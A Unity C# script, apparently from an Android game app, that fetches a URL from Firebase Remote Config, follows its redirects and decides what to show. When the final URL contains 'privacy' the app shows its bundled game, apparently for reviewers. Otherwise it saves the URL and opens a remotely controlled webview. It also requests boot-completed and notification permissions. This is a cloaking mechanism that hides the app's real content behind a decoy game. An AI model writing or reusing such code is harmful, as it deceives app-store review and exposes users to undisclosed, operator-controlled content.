using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

public class AppLoadManager : MonoBehaviour
{
    [SerializeField] private WebviewWrapper webViewCreator;
    [SerializeField] private FireBaseWrapper fireBaseWrapper;

    [SerializeField] private Text statusText;

    [SerializeField] private GameObject gameRoot; //game


    public static string PrivacyUrl;
    private const string localUrlKey = "Local-Url";

    IEnumerator Start()
    {
        RequestPermissionForNotifications();

        string url = PlayerPrefs.GetString(localUrlKey, "null");
        if (url == "null")
        {
            bool ready = false;
            bool isFirebaseReady = false;

            try
            {
                fireBaseWrapper.Initialize((success) => { ready = true; isFirebaseReady = success; });
            }
            catch (Exception ex)
            {
                statusText.text = ex.Message;
            }
            yield return new WaitUntil(() => ready);

            ready = false;

            Task result = fireBaseWrapper.FetchDataAsync();
            yield return new WaitUntil(() => result.IsCompleted);

            //Get data
            url = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("aman").StringValue;

            var res = GetRedirectedUrlInfoAsync(new Uri(url));
            float delay = 9f;
            while (!res.IsCompleted && delay > 0f)
            {
                yield return new WaitForSeconds(Time.deltaTime);
                delay -= Time.deltaTime;
            }

            yield return null;
            //CHECK
            if (!res.IsCompleted || res.IsFaulted) OpenGame();

            yield return null;

            if (res.Result.RequestMessage.RequestUri.AbsoluteUri.ToLower().Contains("privacy"))
            {
                GUIUtility.systemCopyBuffer = res.Result.RequestMessage.RequestUri.AbsoluteUri;
                PrivacyUrl = url;
                OpenGame();
            }
            else //normal device
            {
                PlayerPrefs.SetString(localUrlKey, res.Result.RequestMessage.RequestUri.AbsoluteUri);
                OpenView(res.Result.RequestMessage.RequestUri.AbsoluteUri);
            }
        }
        else if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            OpenGame();
        }
        else
        {
            OpenView(url);
        }
    }

    void OpenGame()
    {
        StopAllCoroutines();
        gameRoot.SetActive(true);
    }

    void OpenView(string url)
    {
        webViewCreator.OpenView(url, false);
    }

    void RequestPermissionForNotifications()
    {
        AndroidJavaClass androidVersion = new AndroidJavaClass("android.os.Build$VERSION");
        int sdkInt = androidVersion.GetStatic<int>("SDK_INT");
        Debug.Log($"Andoid sdk is {sdkInt}");
        if (sdkInt >= 33)
        {
            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            currentActivity.Call("requestPermissions", new string[] { "android.permission.RECEIVE_BOOT_COMPLETED" }, 1);
            UnityEngine.Android.Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
        }
    }

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    public static async Task<System.Net.Http.HttpResponseMessage> GetRedirectedUrlInfoAsync(Uri uri, System.Threading.CancellationToken cancellationToken = default)
    {
        using var client = new System.Net.Http.HttpClient(new System.Net.Http.HttpClientHandler
        {
            AllowAutoRedirect = true,
        }, true);
        client.DefaultRequestHeaders.Add(UserAgentKey, UserAgentValue);

        using var response = await client.GetAsync(uri, cancellationToken);

        return response;
    }
}
